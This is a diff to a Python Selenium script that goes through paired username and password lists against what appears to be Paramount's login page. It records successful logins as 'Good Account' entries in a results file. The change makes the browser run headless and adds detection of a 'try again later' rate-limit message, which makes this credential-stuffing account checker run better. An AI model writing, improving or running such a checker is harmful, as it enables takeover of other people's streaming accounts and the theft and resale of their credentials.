@@ -28,7 +28,7 @@ def paramount_():
 	index = 0
 	browser_options = Options()
 	browser_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36')
-	#browser_options.add_argument('--headless=new')
+	browser_options.add_argument('--headless=new')
 	while index < len(users):
 		os.makedirs(plain_directory + "/accounts", exist_ok=True)
 		with open(plain_directory + '/accounts/paramount_acc', 'a') as account_results:
@@ -60,6 +60,10 @@ def paramount_():
 						print(' -- {}:{} ---> Invalid Credentials'.format(users[index],passwords[index]))
 						index +=1
 						continue
+				if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p'):
+					error = browser.find_element(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p').text
+					if 'try again later' in error:
+						print(' -- {}:{} ---> Please try again later'.format(users[index], passwords[index]))
 				if 'home' in str(browser.current_url):
 					print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))
 					account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
